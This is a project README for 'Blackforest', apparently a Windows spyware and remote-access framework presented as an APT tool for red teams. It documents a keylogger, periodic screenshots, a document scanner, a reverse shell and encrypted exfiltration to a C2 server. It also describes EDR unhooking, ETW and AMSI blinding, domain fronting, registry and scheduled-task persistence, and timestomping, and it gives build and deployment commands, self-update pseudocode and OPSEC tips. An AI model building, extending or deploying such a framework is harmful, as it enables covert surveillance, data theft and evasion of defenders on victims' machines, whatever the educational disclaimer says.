# Blackforest 🌲
**Advanced Persistent Threat (APT) Framework - Level 6 Platinum Architecture**

A professional-grade Windows agent featuring **active EDR unhooking**, **ETW/AMSI blinding**, and **resilient Domain-Fronted C2**.

---

## 📋 Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Features](#features)
- [Quick Start](#quick-start)
- [Technical Details](#technical-details)
- [Security](#security)
- [Development](#development)
- [Troubleshooting](#troubleshooting)
- [License](#license)

---

## 🎯 Overview

Blackforest is a high-performance Windows agent designed for stealth and persistence:

- **EDR Blindness**: Dynamic User-Mode Unhooking and ETW blackout.
- **Resilient C2**: Multi-endpoint fallback pool with Domain Fronting.
- **Encrypted Exfil**: RC4-encrypted data channels with Google-masqueraded HTTP.
- **RSA-Signed Updates**: 2048-bit cryptographic authentication.
- **Zero-Click Persistence**: Registry and WMI/Task Scheduler survival.

### Use Cases

- Red team operations
- Security research
- Penetration testing
- Educational purposes (authorized environments only)

---

## 🏗️ Architecture

### System Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                     VICTIM MACHINE (Windows)                 │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐  │
│  │  Blackforest.exe (13.3 MB)                           │  │
│  │  ────────────────────────────────────────────────────│  │
│  │  • Persistence: Registry + Scheduled Task            │  │
│  │  • Keylogger: Real-time capture                      │  │
│  │  • Screenshot: 30s intervals                         │  │
│  │  • File Scanner: Documents/Downloads                 │  │
│  │  • Auto-Updater: 60s polling                         │  │
│  │  • RSA Verifier: Embedded public key                 │  │
│  └──────────────────────────────────────────────────────┘  │
│                          │                                   │
│                          │ RC4 Encrypted + HTTP Headers      │
│                          ▼                                   │
└─────────────────────────────────────────────────────────────┘
                           │
                  ┌────────┼────────┐
                  │                 │
        Port 4445 │       Port 4444 │       Port 8000
    (Reverse Shell)   (Data Channel)   (Auto-Update)
                  │                 │           │
                  ▼                 ▼           ▼
┌─────────────────────────────────────────────────────────────┐
│                    C2 SERVER (Mac/Linux)                      │
│                                                              │
│  ┌───────────────┐  ┌──────────────┐  ┌─────────────────┐  │
│  │  server.py    │  │ HTTP Server  │  │ RSA Signer      │  │
│  │  ────────────│  │ ──────────── │  │ ───────────────│  │
│  │  • Shell      │  │ • Serves EXE │  │ • Private Key   │  │
│  │  • Data       │  │ • update.txt │  │ • Signs updates │  │
│  │  • Decrypt    │  │ • update.sig │  │ • 2048-bit RSA  │  │
│  └───────────────┘  └──────────────┘  └─────────────────┘  │
└─────────────────────────────────────────────────────────────┘
```

### Component Breakdown

| Component | Technology | Purpose |
|-----------|-----------|---------|
| **Agent** | C++ (Windows API) | Main payload, runs on victim |
| **C2 Server** | Python 3 | Command & control, data receiver |
| **Updater** | HTTP + RSA | Passwordless auto-deployment |
| **Encryption** | RC4 + RSA-2048 | Data protection & authentication |
| **Persistence** | Registry + Task Scheduler | Survival across reboots |

---

## ✨ Features

### Core Capabilities

#### 1. **Reverse Shell** 🖥️
- Full cmd.exe access
- Interactive command execution
- Multi-session support
- Background/foreground switching

#### 2. **Keylogger** ⌨️
- Real-time keystroke capture
- Window title tracking
- Logged to `c2/blackforest_logs.txt`
- Silent operation (no UI)

#### 3. **Screenshot Capture** 📸
- Automatic screen capture every 30 seconds
- JPEG compression
- Saved as `c2/screenshot_IP_TIMESTAMP.jpg`
- GDI+ rendering

#### 4. **File Scanner** 📁
- Monitors `Documents` and `Downloads`
- Targets: `.txt`, `.pdf`, `.doc`, `.docx`, `.key`
- Reports file paths to C2
- Scheduled background scans

#### 5. **Auto-Update** 🔄
- **Passwordless**: No SSH, no credentials
- **Cryptographically Signed**: RSA-2048 signature verification
- **Automatic**: Downloads, verifies, replaces itself
- **Polling**: Checks every 60 seconds
- **Secure**: Rejects tampered binaries

### Security & Evasion
#### 1. **EDR Blindness (Unhooking)** 🛡️
- **Unhooker**: Dynamically reloads `ntdll.dll` from disk to strip EDR hooks.
- **ETW Blinding**: Patches `EtwEventWrite` to prevent system event logging.
- **AMSI Bypass**: Disables script scanning for silent payload execution.

#### 2. **Network Resilience** 🌐
- **Domain Fronting**: Traffic masquerades as `www.google.com` to bypass DPI.
- **Endpoint Fallback**: Automatically rotates through C2 servers if one is blocked.
- **RC4 Encryption**: 64-bit stream cipher for all exfiltrated data.

#### 3. **Persistence** 🔄
- **Registry Run Key**: HKCU persistence.
- **Shadow Task**: Scheduled backup execution.
- **Timestomping**: Mimics legitimate file timestamps to evade frequency analysis.

#### Persistence
- **Registry Run Key**: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- **Scheduled Task**: Daily execution at login
- **Auto-Installation**: Copies self to `%APPDATA%\Blackforest\`

---

## 🚀 Quick Start

### Installation

```bash
# 1. Setup Python
pip3 install cryptography --break-system-packages

# 2. Generate RSA keypair & Build
python3 c2/generate_keys.py
scripts/build.sh

# 3. Sign & Prepare for Auto-Update
python3 c2/sign_update.py bin/Blackforest.exe
mv bin/Blackforest.exe www/
mv update.sig www/

# 4. Start C2 + HTTP Server
python3 c2/server.py &
cd www && python3 -m http.server 8000 &
```

### Updating the Agent (Remote)

```bash
# 1. Rebuild & Sign
scripts/build.sh
python3 c2/sign_update.py bin/Blackforest.exe

# 2. Deploy to web root
mv bin/Blackforest.exe www/
mv update.sig www/

# 3. Done! All active agents will auto-update in 60s.
```

---

## 🔬 Technical Details

### File Structure

```
blackforest/
├── README.md               # User Manual
├── www/                    # HTTP Root (Live Updates)
│   ├── Blackforest.exe     # Signed Binary
│   ├── update.sig          # RSA Signature
│   └── update.txt          # Update Key (Shadowed)
├── bin/                    # Local Build Output
├── c2/                     # Team Server & Signing
│   ├── server.py           # Command & Control
│   ├── sign_update.py      # RSA Signer
│   ├── generate_keys.py    # RSA Key Generator
│   ├── *.pem               # Private Key (KEEP SECRET)
│   └── blackforest_logs.txt # exfil logs
├── src/                    # C++ Core Source
├── include/                # Header Files
├── scripts/                # Operational Scripts
└── research/               # Experimental / Kernel PoC
```

### Network Protocols

#### Port 4445: Reverse Shell
- **Protocol**: TCP
- **Encryption**: None (local network)
- **Format**: Raw PowerShell I/O
- **Usage**: Interactive command execution

#### Port 4444: Data Exfiltration
- **Protocol**: TCP
- **Encryption**: RC4 (`0xDEADBEEFCAFEBABE`)
- **Format**: HTTP POST with headers
- **Data Types**:
  - `[KEYLOG]`: Keystroke data
  - `[SCREENSHOT]`: Base64-encoded JPEG
  - `[HEARTBEAT]`: Status beacon
  - `[DOCS_FOUND]`: File scan results

#### Port 8000: Auto-Update
- **Protocol**: HTTP
- **Encryption**: None (RSA signature for integrity)
- **Files Served**:
  - `update.txt`: Authorization key (64 hex chars)
  - `Blackforest.exe`: New agent binary
  - `update.sig`: RSA-SHA1 signature (256 bytes)

### Cryptography

#### RC4 Stream Cipher
```cpp
Key: 0xDEADBEEFCAFEBABE (64-bit)
Usage: Data channel encryption (Port 4444)
Implementation: Windows CryptoAPI
```

#### RSA-2048 Digital Signatures
```cpp
Algorithm: PKCS#1 v1.5 with SHA-1
Key Size: 2048 bits
Private Key: blackforest_private.pem (PEM format)
Public Key: Embedded in binary (PUBLICKEYBLOB format)
Signature Size: 256 bytes
```

**Signature Workflow:**
1. C2 hashes `Blackforest.exe` with SHA-1
2. C2 signs hash with private key → `update.sig`
3. Agent downloads both files
4. Agent verifies signature with embedded public key
5. If valid → Execute update
6. If invalid → Delete and abort

### Update Mechanism

**Agent Side (updater.cpp):**
```cpp
while(running) {
    // 1. Check authorization
    if (download("http://C2:8000/update.txt") == UPDATE_KEY) {
        
        // 2. Download new binary + signature
        download("http://C2:8000/Blackforest.exe");
        download("http://C2:8000/update.sig");
        
        // 3. Verify RSA signature
        if (RSA::VerifySignature(exe_data, sig_data, PUBLIC_KEY)) {
            
            // 4. Replace current process
            create_batch_script("del old.exe && ren new.exe old.exe && old.exe");
            exec_batch();
            exit();
        }
    }
    sleep(60000); // 60 seconds
}
```

**C2 Side:**
```bash
# Sign update
python3 c2/sign_update.py Blackforest.exe

# Copy to web root
cp bin/Blackforest.exe .

# HTTP server auto-serves files
```

### Data Flow

**Keylog Capture:**
```
User Types → GetAsyncKeyState() → RC4 Encrypt → HTTP POST → C2 Decrypt → Log File
```

**Screenshot Capture:**
```
GDI+ → Capture Desktop → JPEG Encode → RC4 Encrypt → HTTP POST → C2 Decrypt → Save JPG
```

**File Scanner:**
```
Enumerate Directories → Match Extensions → Build List → RC4 Encrypt → HTTP POST → C2 Log
```

### Persistence Implementation

**Registry Auto-Run:**
```cpp
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Value: "BlackforestUpdater"
Data: "%APPDATA%\Blackforest\Blackforest.exe"
```

**Scheduled Task:**
```xml
<Task>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
  </Triggers>
  <Actions>
    <Exec>
      <Command>%APPDATA%\Blackforest\Blackforest.exe</Command>
    </Exec>
  </Actions>
</Task>
```

---

## 🔐 Security

### Threat Model

**Protections:**
- ✅ Network tampering (RSA signatures)
- ✅ Data interception (RC4 encryption)
- ✅ Malware injection (signature verification)
- ✅ Forensic analysis (timestomping, HTTP masq)

**Out of Scope:**
- ⚠️ Kernel-level AV/EDR (user-mode only)
- ⚠️ Network traffic analysis (metadata visible)
- ⚠️ Memory forensics (running process)

### Best Practices

1. **Private Key Security**: Never commit `blackforest_private.pem` to Git
2. **Update Authorization**: Change `update.txt` key after deployment
3. **Network Segmentation**: Use isolated C2 infrastructure
4. **Logging**: Rotate `blackforest_logs.txt` regularly
5. **Testing**: Only deploy in authorized environments

### OPSEC Considerations

- Change RC4 key before deployment
- Modify HTTP User-Agent strings
- Randomize update polling intervals
- Use VPN/proxy for C2 server
- Encrypt C2 logs at rest

---

## 👩‍💻 Development

### Building from Source

```bash
# Cross-compile for Windows (from Mac/Linux)
x86_64-w64-mingw32-g++ \
    -std=c++17 \
    -mwindows \
    -static \
    -I./include \
    -o bin/Blackforest.exe \
    src/**/*.cpp \
    -lws2_32 -lgdi32 -lgdiplus -lurlmon -lwininet -lcrypt32
```

### Adding Features

**Example: New Data Collection Module**

1. Create `src/core/collection/browser_history.cpp`
2. Add header `include/core/collection/browser_history.hpp`
3. Implement `BrowserHistory::Collect()` method
4. Call from `main.cpp`:
```cpp
#include "core/collection/browser_history.hpp"

std::thread browserThread(BrowserHistory::Collect);
```
5. Rebuild and deploy

### Code Style

- **Naming**: `PascalCase` for classes, `camelCase` for functions
- **Headers**: Use include guards (`#ifndef`, `#define`, `#endif`)
- **Error Handling**: Silent failures (no logs on victim)
- **Memory**: RAII, smart pointers where possible

### Testing

```bash
# Build
scripts/build.sh

# Start local C2
python3 c2/server.py &

# Run agent with debugger
wine bin/Blackforest.exe

# Monitor logs
tail -f c2/blackforest_logs.txt
```

---

## 🐛 Troubleshooting

### Common Issues

#### No Connection to C2
**Symptom**: Agent doesn't connect to ports 4444/4445

**Solutions:**
1. Check firewall: `lsof -i :4444` and `lsof -i :4445`
2. Verify C2 IP in `src/main.cpp` (default: `192.168.0.3`)
3. Ensure server.py is running: `ps aux | grep server.py`

#### Encrypted/Garbled Logs
**Symptom**: `blackforest_logs.txt` shows gibberish

**Cause**: RC4 key mismatch

**Solution:**
1. Check key in `src/exfil/tcp_client.cpp` matches `c2/server.py`
2. Rebuild: `scripts/build.sh`
3. Redeploy: `scripts/deploy.sh`

#### Auto-Update Not Working
**Symptom**: Agent downloads but doesn't update

**Diagnostics:**
```bash
# Check HTTP server
lsof -i :8000

# Verify signature
python3 c2/sign_update.py Blackforest.exe

# Monitor update attempts
tail -f ../http_server.log | grep update
```

**Common Causes:**
- HTTP server not running
- Invalid RSA signature
- Wrong update authorization key

#### No Screenshots
**Symptom**: No `.jpg` files in `c2/`

**Solutions:**
1. Wait 30 seconds for first capture
2. Verify GDI+ is available on victim
3. Check permissions on `c2/` directory

### Debug Mode

Rebuild with console output for debugging:

```bash
# Edit scripts/build.sh
# Remove: -mwindows
# Add: -DDEBUG

scripts/build.sh
```

Run with visible console:
```powershell
.\Blackforest.exe
```

---

## 📜 License

**Educational Use Only**

This software is provided for educational, research, and authorized security testing purposes only.

**You are responsible for:**
- Obtaining explicit written authorization before deployment
- Complying with all applicable laws and regulations
- Using this software ethically and legally

**Unauthorized use is prohibited** and may violate:
- Computer Fraud and Abuse Act (CFAA) - USA
- Computer Misuse Act - UK
- Convention on Cybercrime (Budapest Convention) - Europe
- Local cybersecurity laws

The authors assume no liability for misuse.

---

## 🙏 Acknowledgments

- **MinGW-w64 Project**: Cross-platform compilation
- **Python Cryptography**: RSA implementation
- **Windows CryptoAPI**: RC4 encryption
- **GDI+**: Screenshot capture

---

## 📞 Support

**For Issues:**
- Open an issue on GitHub
- Include logs from `c2/blackforest_logs.txt`
- Describe your environment (OS, Python version, etc.)

**For Feature Requests:**
- Fork the repository
- Create a pull request
- Document changes in commit messages

---

**Built with 🌲 by the Blackforest Team**

*"Silent as the forest, persistent as the roots, invisible as the wind."*
